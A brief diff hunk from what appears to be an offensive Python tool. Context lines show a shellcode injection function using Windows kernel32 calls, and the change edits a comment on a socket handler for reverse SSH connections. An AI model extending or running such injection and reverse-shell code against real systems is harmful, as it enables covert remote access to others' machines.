@@ -46,7 +46,7 @@ def inject(shellcode):
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 
-# base socket handler for reverse SSH and HTTP pack
+# base socket handler for reverse SSH
 def handler(chan, host, port):
     sock = socket()
     try:
